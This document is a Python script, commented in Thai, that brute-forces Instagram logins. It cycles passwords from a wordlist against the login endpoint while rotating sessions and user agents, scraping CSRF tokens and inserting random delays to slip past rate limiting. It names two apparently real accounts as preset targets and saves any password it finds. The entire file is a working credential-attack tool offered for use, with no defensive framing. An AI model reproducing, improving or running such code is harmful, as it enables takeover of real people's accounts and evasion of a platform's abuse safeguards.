#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🛡️ SugarGlitch Rate Limit Bypass & Smart Attack
เครื่องมือหลีกเลี่ยง rate limiting และ 429 errors
"""

import time
import random
import requests
from fake_useragent import UserAgent
import json
from datetime import datetime, timedelta

class SmartAttackEngine:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.last_request_time = 0
        self.request_count = 0
        self.cooldown_period = 10  # วินาที
        self.max_requests_per_minute = 5
        self.user_agents = self.get_user_agents()
        
    def get_user_agents(self):
        """รายการ User Agents ที่หลากหลาย"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15"
        ]
    
    def smart_delay(self):
        """สร้าง delay ที่ฉลาดเพื่อหลีกเลี่ยง rate limiting"""
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        
        # คำนวณ delay ตาม request count
        if self.request_count >= self.max_requests_per_minute:
            delay = self.cooldown_period + random.uniform(5, 15)
            print(f"🛡️ Rate limit protection: รอ {delay:.1f} วินาที")
            self.request_count = 0
        else:
            # Random delay 8-25 วินาที
            delay = random.uniform(8, 25)
            print(f"⏳ Smart delay: รอ {delay:.1f} วินาที")
        
        time.sleep(delay)
        self.last_request_time = time.time()
        self.request_count += 1
    
    def rotate_session(self):
        """สร้าง session ใหม่พร้อม headers ใหม่"""
        self.session.close()
        self.session = requests.Session()
        
        # Random User Agent
        user_agent = random.choice(self.user_agents)
        
        # Headers ที่ดูเหมือนจริง
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
        
        self.session.headers.update(headers)
        print(f"🔄 Session rotated with new User-Agent")
    
    def get_csrf_token_safe(self):
        """ดึง CSRF token แบบปลอดภัย"""
        print("🔑 กำลังดึง CSRF token แบบปลอดภัย...")
        
        # Rotate session ก่อนทำ request
        self.rotate_session()
        
        try:
            # ไปหน้าแรกก่อน
            print("🌐 เข้าถึงหน้าแรก Instagram...")
            response = self.session.get(
                'https://www.instagram.com/',
                timeout=30,
                allow_redirects=True
            )
            
            if response.status_code == 429:
                print("❌ Rate limited! รอ cooldown period...")
                time.sleep(60)  # รอ 1 นาที
                return None
            
            # หา CSRF token
            if 'csrf_token' in response.text:
                import re
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    token = csrf_match.group(1)
                    print(f"✅ ได้ CSRF token: {token[:20]}...")
                    return token
            
            print("❌ ไม่พบ CSRF token ในหน้า")
            return None
            
        except Exception as e:
            print(f"❌ Error: {e}")
            return None
    
    def attempt_login_safe(self, username, password):
        """ลองเข้าสู่ระบบแบบปลอดภัย"""
        print(f"\n🎯 กำลังลอง: {username} | {password}")
        
        # Smart delay
        self.smart_delay()
        
        # ดึง CSRF token
        csrf_token = self.get_csrf_token_safe()
        if not csrf_token:
            return {"success": False, "error": "ไม่สามารถดึง CSRF token"}
        
        # เตรียม login data
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        # Headers สำหรับ login
        login_headers = {
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        self.session.headers.update(login_headers)
        
        try:
            print("🔐 กำลังส่ง login request...")
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                timeout=30
            )
            
            if response.status_code == 429:
                print("❌ Rate limited! ต้องหยุดพัก...")
                return {"success": False, "error": "Rate limited", "wait": 300}
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('authenticated'):
                        print("🎉 เข้าสู่ระบบสำเร็จ!")
                        return {"success": True, "data": result}
                    else:
                        print("❌ รหัสผ่านผิด")
                        return {"success": False, "error": "Invalid password"}
                except:
                    print("❌ ไม่สามารถ parse response")
                    return {"success": False, "error": "Parse error"}
            
            print(f"❌ HTTP Error: {response.status_code}")
            return {"success": False, "error": f"HTTP {response.status_code}"}
            
        except Exception as e:
            print(f"❌ Request error: {e}")
            return {"success": False, "error": str(e)}

def load_passwords(file_path):
    """โหลด passwords จากไฟล์"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์ {file_path}")
        return []

def run_smart_attack():
    """รัน attack แบบฉลาด"""
    print("🌸 SugarGlitch Smart Attack Engine")
    print("="*60)
    print("🛡️ ป้องกัน Rate Limiting และ 429 Errors")
    print("⚡ Smart delays และ session rotation")
    print()
    
    # เลือกเป้าหมาย
    print("🎯 เป้าหมายที่มี:")
    print("1. alx.trading")
    print("2. whatilove1728")
    print("3. Custom target")
    
    choice = input("\n🤔 เลือกเป้าหมาย (1-3): ").strip()
    
    if choice == "1":
        target = "alx.trading"
        wordlist = "alx_trading_passwords.txt"
    elif choice == "2":
        target = "whatilove1728"
        wordlist = "whatilove1728.txt"
    elif choice == "3":
        target = input("📱 ใส่ username เป้าหมาย: ").strip()
        wordlist = input("📚 ใส่ชื่อไฟล์ wordlist: ").strip()
    else:
        print("❌ เลือกไม่ถูกต้อง")
        return
    
    # โหลด passwords
    passwords = load_passwords(wordlist)
    if not passwords:
        print(f"❌ ไม่สามารถโหลด passwords จาก {wordlist}")
        return
    
    print(f"\n✅ เป้าหมาย: {target}")
    print(f"✅ Wordlist: {wordlist} ({len(passwords)} passwords)")
    print(f"✅ Rate limit protection: ON")
    print(f"✅ Smart delays: 8-25 วินาที")
    
    # ยืนยัน
    confirm = input("\n🚀 เริ่มการโจมตีไหม? (y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ ยกเลิกการโจมตี")
        return
    
    # เริ่มโจมตี
    engine = SmartAttackEngine()
    results = {
        "target": target,
        "started_at": datetime.now().isoformat(),
        "attempts": [],
        "success": False
    }
    
    for i, password in enumerate(passwords, 1):
        print(f"\n📊 Attempt {i}/{len(passwords)}")
        
        result = engine.attempt_login_safe(target, password)
        
        attempt_data = {
            "attempt": i,
            "password": password,
            "timestamp": datetime.now().isoformat(),
            "result": result
        }
        results["attempts"].append(attempt_data)
        
        if result.get("success"):
            print(f"🎉 พบรหัสผ่าน: {password}")
            results["success"] = True
            results["found_password"] = password
            break
        elif result.get("wait"):
            wait_time = result["wait"]
            print(f"⏸️ หยุดพัก {wait_time} วินาที...")
            time.sleep(wait_time)
        
        # บันทึกผลลัพธ์
        if i % 5 == 0:  # บันทึกทุก 5 attempts
            with open(f'smart_attack_results_{target}.json', 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
    
    # บันทึกผลลัพธ์สุดท้าย
    results["completed_at"] = datetime.now().isoformat()
    with open(f'smart_attack_results_{target}.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    if results["success"]:
        print(f"\n🎉 สำเร็จ! รหัสผ่านคือ: {results['found_password']}")
    else:
        print("\n❌ ไม่พบรหัสผ่านที่ถูกต้อง")
    
    print(f"📊 ผลลัพธ์บันทึกใน: smart_attack_results_{target}.json")

if __name__ == "__main__":
    run_smart_attack()
